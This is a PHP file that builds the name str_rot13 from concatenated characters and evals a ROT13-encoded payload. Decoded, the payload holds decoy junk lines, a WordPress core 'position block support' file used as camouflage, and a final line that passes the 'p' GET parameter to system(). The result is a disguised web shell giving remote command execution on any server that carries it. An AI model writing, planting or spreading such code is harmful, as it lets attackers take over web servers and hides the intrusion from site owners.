<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfvgvba oybpx fhccbeg synt.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.2.0
 */

/**
 * Ertvfgref gur fglyr oybpx nggevohgr sbe oybpx glcrf gung fhccbeg vg.
 *
 * @fvapr 6.2.0
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
 */
shapgvba jc_ertvfgre_cbfvgvba_fhccbeg( $oybpx_glcr ) {
	$unf_cbfvgvba_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'cbfvgvba', snyfr );

	// Frg hc nggevohgrf naq fglyrf jvguva gung vs arrqrq.
	vs ( ! $oybpx_glcr->nggevohgrf ) {
		$oybpx_glcr->nggevohgrf = neenl();
	}

	vs ( $unf_cbfvgvba_fhccbeg && ! neenl_xrl_rkvfgf( 'fglyr', $oybpx_glcr->nggevohgrf ) ) {
		$oybpx_glcr->nggevohgrf['fglyr'] = neenl(
			'glcr' => 'bowrpg',
		);
	}
}

/**
 * Eraqref cbfvgvba fglyrf gb gur oybpx jenccre.
 *
 * @fvapr 6.2.0
 * @npprff cevingr
 *
 * @cnenz  fgevat $oybpx_pbagrag Eraqrerq oybpx pbagrag.
 * @cnenz  neenl  $oybpx         Oybpx bowrpg.
 * @erghea fgevat                Svygrerq oybpx pbagrag.
 */
shapgvba jc_eraqre_cbfvgvba_fhccbeg( $oybpx_pbagrag, $oybpx ) {
	$oybpx_glcr           = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $oybpx['oybpxAnzr'] );
	$unf_cbfvgvba_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'cbfvgvba', snyfr );

	vs (
		! $unf_cbfvgvba_fhccbeg ||
		rzcgl( $oybpx['nggef']['fglyr']['cbfvgvba'] )
	) {
		erghea $oybpx_pbagrag;
	}

	$tybony_frggvatf          = jc_trg_tybony_frggvatf();
	$gurzr_unf_fgvpxl_fhccbeg = vffrg( $tybony_frggvatf['cbfvgvba']['fgvpxl'] ) ? $tybony_frggvatf['cbfvgvba']['fgvpxl'] : snyfr;
	$gurzr_unf_svkrq_fhccbeg  = vffrg( $tybony_frggvatf['cbfvgvba']['svkrq'] ) ? $tybony_frggvatf['cbfvgvba']['svkrq'] : snyfr;

	// Bayl nyybj bhgchg sbe cbfvgvba glcrf gung gur gurzr fhccbegf.
	$nyybjrq_cbfvgvba_glcrf = neenl();
	vs ( gehr === $gurzr_unf_fgvpxl_fhccbeg ) {
		$nyybjrq_cbfvgvba_glcrf[] = 'fgvpxl';
	}
	vs ( gehr === $gurzr_unf_svkrq_fhccbeg ) {
		$nyybjrq_cbfvgvba_glcrf[] = 'svkrq';
	}

	$fglyr_nggevohgr = vffrg( $oybpx['nggef']['fglyr'] ) ? $oybpx['nggef']['fglyr'] : ahyy;
	$pynff_anzr      = jc_havdhr_vq( 'jc-pbagnvare-' );
	$fryrpgbe        = \".$pynff_anzr\";
	$cbfvgvba_fglyrf = neenl();
	$cbfvgvba_glcr   = vffrg( $fglyr_nggevohgr['cbfvgvba']['glcr'] ) ? $fglyr_nggevohgr['cbfvgvba']['glcr'] : '';
	$jenccre_pynffrf = neenl();

	vs (
		va_neenl( $cbfvgvba_glcr, $nyybjrq_cbfvgvba_glcrf, gehr )
	) {
		$jenccre_pynffrf[] = $pynff_anzr;
		$jenccre_pynffrf[] = 'vf-cbfvgvba-' . $cbfvgvba_glcr;
		$fvqrf             = neenl( 'gbc', 'evtug', 'obggbz', 'yrsg' );

		sbernpu ( $fvqrf nf $fvqr ) {
			$fvqr_inyhr = vffrg( $fglyr_nggevohgr['cbfvgvba'][ $fvqr ] ) ? $fglyr_nggevohgr['cbfvgvba'][ $fvqr ] : ahyy;
			vs ( ahyy !== $fvqr_inyhr ) {
				/*
				 * Sbe svkrq be fgvpxl gbc cbfvgvbaf,
				 * rafher gur inyhr vapyhqrf na bssfrg sbe gur ybttrq va nqzva one.
				 */
				vs (
					'gbc' === $fvqr &&
					( 'svkrq' === $cbfvgvba_glcr || 'fgvpxl' === $cbfvgvba_glcr )
				) {
					// Rafher 0 inyhrf pna or hfrq va `pnyp()` pnyphyngvbaf.
					vs ( '0' === $fvqr_inyhr || 0 === $fvqr_inyhr ) {
						$fvqr_inyhr = '0ck';
					}

					// Rafher pheerag fvqr inyhr nyfb snpgbef va gur urvtug bs gur ybttrq va nqzva one.
					$fvqr_inyhr = \"pnyp($fvqr_inyhr + ine(--jc-nqzva--nqzva-one--cbfvgvba-bssfrg, 0ck))\";
				}

				$cbfvgvba_fglyrf[] =
					neenl(
						'fryrpgbe'     => $fryrpgbe,
						'qrpynengvbaf' => neenl(
							$fvqr => $fvqr_inyhr,
						),
					);
			}
		}

		$cbfvgvba_fglyrf[] =
			neenl(
				'fryrpgbe'     => $fryrpgbe,
				'qrpynengvbaf' => neenl(
					'cbfvgvba' => $cbfvgvba_glcr,
					'm-vaqrk'  => '10',
				),
			);
	}

	vs ( ! rzcgl( $cbfvgvba_fglyrf ) ) {
		/*
		 * Nqq gb gur fglyr ratvar fgber gb radhrhr naq eraqre cbfvgvba fglyrf.
		 */
		jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf(
			$cbfvgvba_fglyrf,
			neenl(
				'pbagrkg'  => 'oybpx-fhccbegf',
				'cerggvsl' => snyfr,
			)
		);

		// Vawrpg pynff anzr gb oybpx pbagnvare znexhc.
		$pbagrag = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );
		$pbagrag->arkg_gnt();
		sbernpu ( $jenccre_pynffrf nf $pynff ) {
			$pbagrag->nqq_pynff( $pynff );
		}
		erghea (fgevat) $pbagrag;
	}

	erghea $oybpx_pbagrag;
}

// Ertvfgre gur oybpx fhccbeg.
JC_Oybpx_Fhccbegf::trg_vafgnapr()->ertvfgre(
	'cbfvgvba',
	neenl(
		'ertvfgre_nggevohgr' => 'jc_ertvfgre_cbfvgvba_fhccbeg',
	)
);
nqq_svygre( 'eraqre_oybpx', 'jc_eraqre_cbfvgvba_fhccbeg', 10, 2 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>